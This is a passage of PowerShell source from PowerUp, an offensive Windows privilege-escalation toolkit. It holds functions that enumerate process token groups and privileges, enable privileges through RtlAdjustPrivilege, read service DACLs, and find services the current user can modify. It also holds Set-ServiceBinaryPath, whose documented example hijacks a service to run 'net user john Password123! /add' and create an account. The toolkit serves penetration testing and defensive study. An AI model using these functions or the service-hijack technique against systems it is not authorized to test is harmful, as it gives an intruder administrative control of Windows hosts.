            [IntPtr]$TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivilegesPtrSize)

            $Success = $Advapi32::GetTokenInformation($TokenHandle, 3, $TokenPrivilegesPtr, $TokenPrivilegesPtrSize, [ref]$TokenPrivilegesPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success) {
                $TokenPrivileges = $TokenPrivilegesPtr -as $TOKEN_PRIVILEGES
                For ($i=0; $i -lt $TokenPrivileges.PrivilegeCount; $i++) {
                    $Privilege = New-Object PSObject
                    $Privilege | Add-Member Noteproperty 'Privilege' $TokenPrivileges.Privileges[$i].Luid.LowPart.ToString()
                    # cast the lower Luid field as our LuidAttributes enum
                    $Privilege | Add-Member Noteproperty 'Attributes' ($TokenPrivileges.Privileges[$i].Attributes -as $LuidAttributes)
                    $Privilege | Add-Member Noteproperty 'TokenHandle' $TokenHandle
                    $Privilege.PSObject.TypeNames.Insert(0, 'PowerUp.TokenPrivilege')
                    $Privilege
                }
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)
        }
        else {
            $TokenResult = New-Object PSObject

            # query the process token with the TOKEN_INFORMATION_CLASS = 8 enum to retrieve a TOKEN_TYPE enum

            # initial query to determine the necessary buffer size
            $TokenTypePtrSize = 0
            $Success = $Advapi32::GetTokenInformation($TokenHandle, 8, 0, $TokenTypePtrSize, [ref]$TokenTypePtrSize)
            [IntPtr]$TokenTypePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenTypePtrSize)

            $Success = $Advapi32::GetTokenInformation($TokenHandle, 8, $TokenTypePtr, $TokenTypePtrSize, [ref]$TokenTypePtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success) {
                $Temp = $TokenTypePtr -as $TOKEN_TYPE
                $TokenResult | Add-Member Noteproperty 'Type' $Temp.Type
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenTypePtr)

            # now query the process token with the TOKEN_INFORMATION_CLASS = 8 enum to retrieve a SECURITY_IMPERSONATION_LEVEL enum

            # initial query to determine the necessary buffer size
            $TokenImpersonationLevelPtrSize = 0
            $Success = $Advapi32::GetTokenInformation($TokenHandle, 8, 0, $TokenImpersonationLevelPtrSize, [ref]$TokenImpersonationLevelPtrSize)
            [IntPtr]$TokenImpersonationLevelPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenImpersonationLevelPtrSize)

            $Success2 = $Advapi32::GetTokenInformation($TokenHandle, 8, $TokenImpersonationLevelPtr, $TokenImpersonationLevelPtrSize, [ref]$TokenImpersonationLevelPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success2) {
                $Temp = $TokenImpersonationLevelPtr -as $IMPERSONATION_LEVEL
                $TokenResult | Add-Member Noteproperty 'ImpersonationLevel' $Temp.ImpersonationLevel
                $TokenResult | Add-Member Noteproperty 'TokenHandle' $TokenHandle
                $TokenResult.PSObject.TypeNames.Insert(0, 'PowerUp.TokenType')
                $TokenResult
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenImpersonationLevelPtr)
        }
    }
}


function Get-ProcessTokenGroup {
<#
.SYNOPSIS

Returns all SIDs that the current token context is a part of, whether they are disabled or not.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Get-TokenInformation  

.DESCRIPTION

First, if a process ID is passed, then the process is opened using OpenProcess(),
otherwise GetCurrentProcess() is used to open up a pseudohandle to the current process.
OpenProcessToken() is then used to get a handle to the specified process token. The token
is then passed to Get-TokenInformation to query the current token groups for the specified
token.

.PARAMETER Id

The process ID to enumerate token groups for, otherwise defaults to the current process.

.EXAMPLE

Get-ProcessTokenGroup

SID                          Attributes         TokenHandle           ProcessId
---                          ----------         -----------           ---------
S-1-5-21-8901718... ...SE_GROUP_ENABLED                1616                3684
S-1-1-0             ...SE_GROUP_ENABLED                1616                3684
S-1-5-32-544        ..., SE_GROUP_OWNER                1616                3684
S-1-5-32-545        ...SE_GROUP_ENABLED                1616                3684
S-1-5-4             ...SE_GROUP_ENABLED                1616                3684
S-1-2-1             ...SE_GROUP_ENABLED                1616                3684
S-1-5-11            ...SE_GROUP_ENABLED                1616                3684
S-1-5-15            ...SE_GROUP_ENABLED                1616                3684
S-1-5-5-0-1053459   ...NTEGRITY_ENABLED                1616                3684
S-1-2-0             ...SE_GROUP_ENABLED                1616                3684
S-1-18-1            ...SE_GROUP_ENABLED                1616                3684
S-1-16-12288                                           1616                3684

.EXAMPLE

Get-Process notepad | Get-ProcessTokenGroup

SID                          Attributes         TokenHandle           ProcessId
---                          ----------         -----------           ---------
S-1-5-21-8901718... ...SE_GROUP_ENABLED                1892                2044
S-1-1-0             ...SE_GROUP_ENABLED                1892                2044
S-1-5-32-544        ...SE_FOR_DENY_ONLY                1892                2044
S-1-5-32-545        ...SE_GROUP_ENABLED                1892                2044
S-1-5-4             ...SE_GROUP_ENABLED                1892                2044
S-1-2-1             ...SE_GROUP_ENABLED                1892                2044
S-1-5-11            ...SE_GROUP_ENABLED                1892                2044
S-1-5-15            ...SE_GROUP_ENABLED                1892                2044
S-1-5-5-0-1053459   ...NTEGRITY_ENABLED                1892                2044
S-1-2-0             ...SE_GROUP_ENABLED                1892                2044
S-1-18-1            ...SE_GROUP_ENABLED                1892                2044
S-1-16-8192                                            1892                2044


.OUTPUTS

PowerUp.TokenGroup

Outputs a custom object containing the token group (SID/attributes) for the specified process.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.TokenGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ProcessID')]
        [UInt32]
        [ValidateNotNullOrEmpty()]
        $Id
    )

    PROCESS {
        if ($PSBoundParameters['Id']) {
            $ProcessHandle = $Kernel32::OpenProcess(0x400, $False, $Id);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ProcessHandle -eq 0) {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            else {
                $ProcessID = $Id
            }
        }
        else {
            # open up a pseudo handle to the current process- don't need to worry about closing
            $ProcessHandle = $Kernel32::GetCurrentProcess()
            $ProcessID = $PID
        }

        if ($ProcessHandle) {
            [IntPtr]$hProcToken = [IntPtr]::Zero
            $TOKEN_QUERY = 0x0008
            $Success = $Advapi32::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success) {
                $TokenGroups = Get-TokenInformation -TokenHandle $hProcToken -InformationClass 'Groups'
                $TokenGroups | ForEach-Object {
                    $_ | Add-Member Noteproperty 'ProcessId' $ProcessID
                    $_
                }
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }

            if ($PSBoundParameters['Id']) {
                # close the handle if we used OpenProcess()
                $Null = $Kernel32::CloseHandle($ProcessHandle)
            }
        }
    }
}


function Get-ProcessTokenPrivilege {
<#
.SYNOPSIS

Returns all privileges for the current (or specified) process ID.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Get-TokenInformation  

.DESCRIPTION

First, if a process ID is passed, then the process is opened using OpenProcess(),
otherwise GetCurrentProcess() is used to open up a pseudohandle to the current process.
OpenProcessToken() is then used to get a handle to the specified process token. The token
is then passed to Get-TokenInformation to query the current privileges for the specified
token.

.PARAMETER Id

The process ID to enumerate token groups for, otherwise defaults to the current process.

.PARAMETER Special

Switch. Only return 'special' privileges, meaning admin-level privileges.
These include SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege,
SeRestorePrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeTcbPrivilege.

.EXAMPLE

Get-ProcessTokenPrivilege | ft -a

WARNING: 2 columns do not fit into the display and were removed.

Privilege                                                            Attributes
---------                                                            ----------
SeUnsolicitedInputPrivilege                                            DISABLED
SeTcbPrivilege                                                         DISABLED
SeSecurityPrivilege                                                    DISABLED
SeTakeOwnershipPrivilege                                               DISABLED
SeLoadDriverPrivilege                                                  DISABLED
SeSystemProfilePrivilege                                               DISABLED
SeSystemtimePrivilege                                                  DISABLED
SeProfileSingleProcessPrivilege                                        DISABLED
SeIncreaseBasePriorityPrivilege                                        DISABLED
SeCreatePagefilePrivilege                                              DISABLED
SeBackupPrivilege                                                      DISABLED
SeRestorePrivilege                                                     DISABLED
SeShutdownPrivilege                                                    DISABLED
SeDebugPrivilege                                           SE_PRIVILEGE_ENABLED
SeSystemEnvironmentPrivilege                                           DISABLED
SeChangeNotifyPrivilege         ...EGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
SeRemoteShutdownPrivilege                                              DISABLED
SeUndockPrivilege                                                      DISABLED
SeManageVolumePrivilege                                                DISABLED
SeImpersonatePrivilege          ...EGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
SeCreateGlobalPrivilege         ...EGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
SeIncreaseWorkingSetPrivilege                                          DISABLED
SeTimeZonePrivilege                                                    DISABLED
SeCreateSymbolicLinkPrivilege                                          DISABLED

.EXAMPLE

Get-ProcessTokenPrivilege -Special

Privilege                    Attributes         TokenHandle           ProcessId
---------                    ----------         -----------           ---------
SeTcbPrivilege                 DISABLED                2268                3684
SeSecurityPrivilege            DISABLED                2268                3684
SeTakeOwnershipP...            DISABLED                2268                3684
SeLoadDriverPriv...            DISABLED                2268                3684
SeBackupPrivilege              DISABLED                2268                3684
SeRestorePrivilege             DISABLED                2268                3684
SeDebugPrivilege    ...RIVILEGE_ENABLED                2268                3684
SeSystemEnvironm...            DISABLED                2268                3684
SeImpersonatePri... ...RIVILEGE_ENABLED                2268                3684

.EXAMPLE

Get-Process notepad | Get-ProcessTokenPrivilege | fl

Privilege   : SeShutdownPrivilege
Attributes  : DISABLED
TokenHandle : 2164
ProcessId   : 2044

Privilege   : SeChangeNotifyPrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 2164
ProcessId   : 2044

Privilege   : SeUndockPrivilege
Attributes  : DISABLED
TokenHandle : 2164
ProcessId   : 2044

Privilege   : SeIncreaseWorkingSetPrivilege
Attributes  : DISABLED
TokenHandle : 2164
ProcessId   : 2044

Privilege   : SeTimeZonePrivilege
Attributes  : DISABLED
TokenHandle : 2164
ProcessId   : 2044

.OUTPUTS

PowerUp.TokenPrivilege

Outputs a custom object containing the token privilege (name/attributes) for the specified process.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.TokenPrivilege')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ProcessID')]
        [UInt32]
        [ValidateNotNullOrEmpty()]
        $Id,

        [Switch]
        [Alias('Privileged')]
        $Special
    )

    BEGIN {
        $SpecialPrivileges = @('SeSecurityPrivilege', 'SeTakeOwnershipPrivilege', 'SeLoadDriverPrivilege', 'SeBackupPrivilege', 'SeRestorePrivilege', 'SeDebugPrivilege', 'SeSystemEnvironmentPrivilege', 'SeImpersonatePrivilege', 'SeTcbPrivilege')
    }

    PROCESS {
        if ($PSBoundParameters['Id']) {
            $ProcessHandle = $Kernel32::OpenProcess(0x400, $False, $Id);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ProcessHandle -eq 0) {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            else {
                $ProcessID = $Id
            }
        }
        else {
            # open up a pseudo handle to the current process- don't need to worry about closing
            $ProcessHandle = $Kernel32::GetCurrentProcess()
            $ProcessID = $PID
        }

        if ($ProcessHandle) {
            [IntPtr]$hProcToken = [IntPtr]::Zero
            $TOKEN_QUERY = 0x0008
            $Success = $Advapi32::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($Success) {
                Get-TokenInformation -TokenHandle $hProcToken -InformationClass 'Privileges' | ForEach-Object {
                    if ($PSBoundParameters['Special']) {
                        if ($SpecialPrivileges -Contains $_.Privilege) {
                            $_ | Add-Member Noteproperty 'ProcessId' $ProcessID
                            $_ | Add-Member Aliasproperty Name ProcessId
                            $_
                        }
                    }
                    else {
                        $_ | Add-Member Noteproperty 'ProcessId' $ProcessID
                        $_
                    }
                }
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }

            if ($PSBoundParameters['Id']) {
                # close the handle if we used OpenProcess()
                $Null = $Kernel32::CloseHandle($ProcessHandle)
            }
        }
    }
}


function Get-ProcessTokenType {
<#
.SYNOPSIS

Returns the token type and impersonation level.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Get-TokenInformation  

.DESCRIPTION

First, if a process ID is passed, then the process is opened using OpenProcess(),
otherwise GetCurrentProcess() is used to open up a pseudohandle to the current process.
OpenProcessToken() is then used to get a handle to the specified process token. The token
is then passed to Get-TokenInformation to query the type and impersonation level for the
specified token.

.PARAMETER Id

The process ID to enumerate token groups for, otherwise defaults to the current process.

.EXAMPLE

Get-ProcessTokenType

               Type  ImpersonationLevel         TokenHandle           ProcessId
               ----  ------------------         -----------           ---------
            Primary      Identification                 872                3684


.EXAMPLE

Get-Process notepad | Get-ProcessTokenType | fl

Type               : Primary
ImpersonationLevel : Identification
TokenHandle        : 1356
ProcessId          : 2044

.OUTPUTS

PowerUp.TokenType

Outputs a custom object containing the token type and impersonation level for the specified process.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.TokenType')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ProcessID')]
        [UInt32]
        [ValidateNotNullOrEmpty()]
        $Id
    )

    PROCESS {
        if ($PSBoundParameters['Id']) {
            $ProcessHandle = $Kernel32::OpenProcess(0x400, $False, $Id);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ProcessHandle -eq 0) {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            else {
                $ProcessID = $Id
            }
        }
        else {
            # open up a pseudo handle to the current process- don't need to worry about closing
            $ProcessHandle = $Kernel32::GetCurrentProcess()
            $ProcessID = $PID
        }

        if ($ProcessHandle) {
            [IntPtr]$hProcToken = [IntPtr]::Zero
            $TOKEN_QUERY = 0x0008
            $Success = $Advapi32::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success) {
                $TokenType = Get-TokenInformation -TokenHandle $hProcToken -InformationClass 'Type'
                $TokenType | ForEach-Object {
                    $_ | Add-Member Noteproperty 'ProcessId' $ProcessID
                    $_
                }
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }

            if ($PSBoundParameters['Id']) {
                # close the handle if we used OpenProcess()
                $Null = $Kernel32::CloseHandle($ProcessHandle)
            }
        }
    }
}


function Enable-Privilege {
<#
.SYNOPSIS

Enables a specific privilege for the current process.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

Uses RtlAdjustPrivilege to enable a specific privilege for the current process.
Privileges can be passed by string, or the output from Get-ProcessTokenPrivilege
can be passed on the pipeline.

.EXAMPLE

Get-ProcessTokenPrivilege

                    Privilege                    Attributes                     ProcessId
                    ---------                    ----------                     ---------
          SeShutdownPrivilege                      DISABLED                          3620
      SeChangeNotifyPrivilege ...AULT, SE_PRIVILEGE_ENABLED                          3620
            SeUndockPrivilege                      DISABLED                          3620
SeIncreaseWorkingSetPrivilege                      DISABLED                          3620
          SeTimeZonePrivilege                      DISABLED                          3620

Enable-Privilege SeShutdownPrivilege

Get-ProcessTokenPrivilege

                    Privilege                    Attributes                     ProcessId
                    ---------                    ----------                     ---------
          SeShutdownPrivilege          SE_PRIVILEGE_ENABLED                          3620
      SeChangeNotifyPrivilege ...AULT, SE_PRIVILEGE_ENABLED                          3620
            SeUndockPrivilege                      DISABLED                          3620
SeIncreaseWorkingSetPrivilege                      DISABLED                          3620
          SeTimeZonePrivilege                      DISABLED                          3620

.EXAMPLE

Get-ProcessTokenPrivilege

Privilege                                        Attributes                     ProcessId
---------                                        ----------                     ---------
SeShutdownPrivilege                                DISABLED                          2828
SeChangeNotifyPrivilege       ...AULT, SE_PRIVILEGE_ENABLED                          2828
SeUndockPrivilege                                  DISABLED                          2828
SeIncreaseWorkingSetPrivilege                      DISABLED                          2828
SeTimeZonePrivilege                                DISABLED                          2828


Get-ProcessTokenPrivilege | Enable-Privilege -Verbose
VERBOSE: Attempting to enable SeShutdownPrivilege
VERBOSE: Attempting to enable SeChangeNotifyPrivilege
VERBOSE: Attempting to enable SeUndockPrivilege
VERBOSE: Attempting to enable SeIncreaseWorkingSetPrivilege
VERBOSE: Attempting to enable SeTimeZonePrivilege

Get-ProcessTokenPrivilege

Privilege                                        Attributes                     ProcessId
---------                                        ----------                     ---------
SeShutdownPrivilege                    SE_PRIVILEGE_ENABLED                          2828
SeChangeNotifyPrivilege       ...AULT, SE_PRIVILEGE_ENABLED                          2828
SeUndockPrivilege                      SE_PRIVILEGE_ENABLED                          2828
SeIncreaseWorkingSetPrivilege          SE_PRIVILEGE_ENABLED                          2828
SeTimeZonePrivilege                    SE_PRIVILEGE_ENABLED                          2828

.LINK

http://forum.sysinternals.com/tip-easy-way-to-enable-privileges_topic15745.html
#>

    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Privileges')]
        [ValidateSet('SeCreateTokenPrivilege', 'SeAssignPrimaryTokenPrivilege', 'SeLockMemoryPrivilege', 'SeIncreaseQuotaPrivilege', 'SeUnsolicitedInputPrivilege', 'SeMachineAccountPrivilege', 'SeTcbPrivilege', 'SeSecurityPrivilege', 'SeTakeOwnershipPrivilege', 'SeLoadDriverPrivilege', 'SeSystemProfilePrivilege', 'SeSystemtimePrivilege', 'SeProfileSingleProcessPrivilege', 'SeIncreaseBasePriorityPrivilege', 'SeCreatePagefilePrivilege', 'SeCreatePermanentPrivilege', 'SeBackupPrivilege', 'SeRestorePrivilege', 'SeShutdownPrivilege', 'SeDebugPrivilege', 'SeAuditPrivilege', 'SeSystemEnvironmentPrivilege', 'SeChangeNotifyPrivilege', 'SeRemoteShutdownPrivilege', 'SeUndockPrivilege', 'SeSyncAgentPrivilege', 'SeEnableDelegationPrivilege', 'SeManageVolumePrivilege', 'SeImpersonatePrivilege', 'SeCreateGlobalPrivilege', 'SeTrustedCredManAccessPrivilege', 'SeRelabelPrivilege', 'SeIncreaseWorkingSetPrivilege', 'SeTimeZonePrivilege', 'SeCreateSymbolicLinkPrivilege')]
        [String[]]
        $Privilege
    )

    PROCESS {
        ForEach ($Priv in $Privilege) {
            [UInt32]$PreviousState = 0
            Write-Verbose "Attempting to enable $Priv"
            $Success = $NTDll::RtlAdjustPrivilege($SecurityEntity::$Priv, $True, $False, [ref]$PreviousState)
            if ($Success -ne 0) {
                Write-Warning "RtlAdjustPrivilege for $Priv failed: $Success"
            }
        }
    }
}


function Add-ServiceDacl {
<#
.SYNOPSIS

Adds a Dacl field to a service object returned by Get-Service.

Author: Matthew Graeber (@mattifestation)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

Takes one or more ServiceProcess.ServiceController objects on the pipeline and adds a
Dacl field to each object. It does this by opening a handle with ReadControl for the
service with using the GetServiceHandle Win32 API call and then uses
QueryServiceObjectSecurity to retrieve a copy of the security descriptor for the service.

.PARAMETER Name

An array of one or more service names to add a service Dacl for. Passable on the pipeline.

.EXAMPLE

Get-Service | Add-ServiceDacl

Add Dacls for every service the current user can read.

.EXAMPLE

Get-Service -Name VMTools | Add-ServiceDacl

Add the Dacl to the VMTools service object.

.OUTPUTS

ServiceProcess.ServiceController

.LINK

https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('ServiceProcess.ServiceController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name
    )

    BEGIN {
        filter Local:Get-ServiceReadControlHandle {
            [OutputType([IntPtr])]
            Param(
                [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
                [ValidateNotNullOrEmpty()]
                [ValidateScript({ $_ -as 'ServiceProcess.ServiceController' })]
                $Service
            )

            $GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')
            $ReadControl = 0x00020000
            $RawHandle = $GetServiceHandle.Invoke($Service, @($ReadControl))
            $RawHandle
        }
    }

    PROCESS {
        ForEach($ServiceName in $Name) {

            $IndividualService = Get-Service -Name $ServiceName -ErrorAction Stop

            try {
                Write-Verbose "Add-ServiceDacl IndividualService : $($IndividualService.Name)"
                $ServiceHandle = Get-ServiceReadControlHandle -Service $IndividualService
            }
            catch {
                $ServiceHandle = $Null
                Write-Verbose "Error opening up the service handle with read control for $($IndividualService.Name) : $_"
            }

            if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {
                $SizeNeeded = 0

                $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, @(), 0, [Ref] $SizeNeeded);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                # 122 == The data area passed to a system call is too small
                if ((-not $Result) -and ($LastError -eq 122) -and ($SizeNeeded -gt 0)) {
                    $BinarySecurityDescriptor = New-Object Byte[]($SizeNeeded)

                    $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, $BinarySecurityDescriptor, $BinarySecurityDescriptor.Count, [Ref] $SizeNeeded);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if (-not $Result) {
                        Write-Error ([ComponentModel.Win32Exception] $LastError)
                    }
                    else {
                        $RawSecurityDescriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $BinarySecurityDescriptor, 0
                        $Dacl = $RawSecurityDescriptor.DiscretionaryAcl | ForEach-Object {
                            Add-Member -InputObject $_ -MemberType NoteProperty -Name AccessRights -Value ($_.AccessMask -as $ServiceAccessRights) -PassThru
                        }
                        Add-Member -InputObject $IndividualService -MemberType NoteProperty -Name Dacl -Value $Dacl -PassThru
                    }
                }
                else {
                    Write-Error ([ComponentModel.Win32Exception] $LastError)
                }
                $Null = $Advapi32::CloseServiceHandle($ServiceHandle)
            }
        }
    }
}


function Set-ServiceBinaryPath {
<#
.SYNOPSIS

Sets the binary path for a service to a specified value.

Author: Will Schroeder (@harmj0y), Matthew Graeber (@mattifestation)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

Takes a service Name or a ServiceProcess.ServiceController on the pipeline and first opens up a
service handle to the service with ConfigControl access using the GetServiceHandle
Win32 API call. ChangeServiceConfig is then used to set the binary path (lpBinaryPathName/binPath)
to the string value specified by binPath, and the handle is closed off.

Takes one or more ServiceProcess.ServiceController objects on the pipeline and adds a
Dacl field to each object. It does this by opening a handle with ReadControl for the
service with using the GetServiceHandle Win32 API call and then uses
QueryServiceObjectSecurity to retrieve a copy of the security descriptor for the service.

.PARAMETER Name

An array of one or more service names to set the binary path for. Required.

.PARAMETER Path

The new binary path (lpBinaryPathName) to set for the specified service. Required.

.EXAMPLE

Set-ServiceBinaryPath -Name VulnSvc -Path 'net user john Password123! /add'

Sets the binary path for 'VulnSvc' to be a command to add a user.

.EXAMPLE

Get-Service VulnSvc | Set-ServiceBinaryPath -Path 'net user john Password123! /add'

Sets the binary path for 'VulnSvc' to be a command to add a user.

.OUTPUTS

System.Boolean

$True if configuration succeeds, $False otherwise.

.LINK

https://msdn.microsoft.com/en-us/library/windows/desktop/ms681987(v=vs.85).aspx
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType('System.Boolean')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name,

        [Parameter(Position=1, Mandatory = $True)]
        [Alias('BinaryPath', 'binPath')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Path
    )

    BEGIN {
        filter Local:Get-ServiceConfigControlHandle {
            [OutputType([IntPtr])]
            Param(
                [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
                [ServiceProcess.ServiceController]
                [ValidateNotNullOrEmpty()]
                $TargetService
            )
            $GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')
            $ConfigControl = 0x00000002
            $RawHandle = $GetServiceHandle.Invoke($TargetService, @($ConfigControl))
            $RawHandle
        }
    }

    PROCESS {

        ForEach($IndividualService in $Name) {

            $TargetService = Get-Service -Name $IndividualService -ErrorAction Stop
            try {
                $ServiceHandle = Get-ServiceConfigControlHandle -TargetService $TargetService
            }
            catch {
                $ServiceHandle = $Null
                Write-Verbose "Error opening up the service handle with read control for $IndividualService : $_"
            }

            if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {

                $SERVICE_NO_CHANGE = [UInt32]::MaxValue
                $Result = $Advapi32::ChangeServiceConfig($ServiceHandle, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, "$Path", [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                if ($Result -ne 0) {
                    Write-Verbose "binPath for $IndividualService successfully set to '$Path'"
                    $True
                }
                else {
                    Write-Error ([ComponentModel.Win32Exception] $LastError)
                    $Null
                }

                $Null = $Advapi32::CloseServiceHandle($ServiceHandle)
            }
        }
    }
}


function Test-ServiceDaclPermission {
<#
.SYNOPSIS

Tests one or more passed services or service names against a given permission set,
returning the service objects where the current user have the specified permissions.

Author: Will Schroeder (@harmj0y), Matthew Graeber (@mattifestation)  
License: BSD 3-Clause  
Required Dependencies: Add-ServiceDacl  

.DESCRIPTION

Takes a service Name or a ServiceProcess.ServiceController on the pipeline, and first adds
a service Dacl to the service object with Add-ServiceDacl. All group SIDs for the current
user are enumerated services where the user has some type of permission are filtered. The
services are then filtered against a specified set of permissions, and services where the
current user have the specified permissions are returned.

.PARAMETER Name

An array of one or more service names to test against the specified permission set.

.PARAMETER Permissions

A manual set of permission to test again. One of:'QueryConfig', 'ChangeConfig', 'QueryStatus',
'EnumerateDependents', 'Start', 'Stop', 'PauseContinue', 'Interrogate', UserDefinedControl',
'Delete', 'ReadControl', 'WriteDac', 'WriteOwner', 'Synchronize', 'AccessSystemSecurity',
'GenericAll', 'GenericExecute', 'GenericWrite', 'GenericRead', 'AllAccess'

.PARAMETER PermissionSet

A pre-defined permission set to test a specified service against. 'ChangeConfig', 'Restart', or 'AllAccess'.

.EXAMPLE

Get-Service | Test-ServiceDaclPermission

Return all service objects where the current user can modify the service configuration.

.EXAMPLE

Get-Service | Test-ServiceDaclPermission -PermissionSet 'Restart'

Return all service objects that the current user can restart.

.EXAMPLE

Test-ServiceDaclPermission -Permissions 'Start' -Name 'VulnSVC'

Return the VulnSVC object if the current user has start permissions.

.OUTPUTS

ServiceProcess.ServiceController

.LINK

https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('ServiceProcess.ServiceController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName', 'Service')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name,

        [String[]]
        [ValidateSet('QueryConfig', 'ChangeConfig', 'QueryStatus', 'EnumerateDependents', 'Start', 'Stop', 'PauseContinue', 'Interrogate', 'UserDefinedControl', 'Delete', 'ReadControl', 'WriteDac', 'WriteOwner', 'Synchronize', 'AccessSystemSecurity', 'GenericAll', 'GenericExecute', 'GenericWrite', 'GenericRead', 'AllAccess')]
        $Permissions,

        [String]
        [ValidateSet('ChangeConfig', 'Restart', 'AllAccess')]
        $PermissionSet = 'ChangeConfig'
    )

    BEGIN {
        $AccessMask = @{
            'QueryConfig'           = [uint32]'0x00000001'
            'ChangeConfig'          = [uint32]'0x00000002'
            'QueryStatus'           = [uint32]'0x00000004'
            'EnumerateDependents'   = [uint32]'0x00000008'
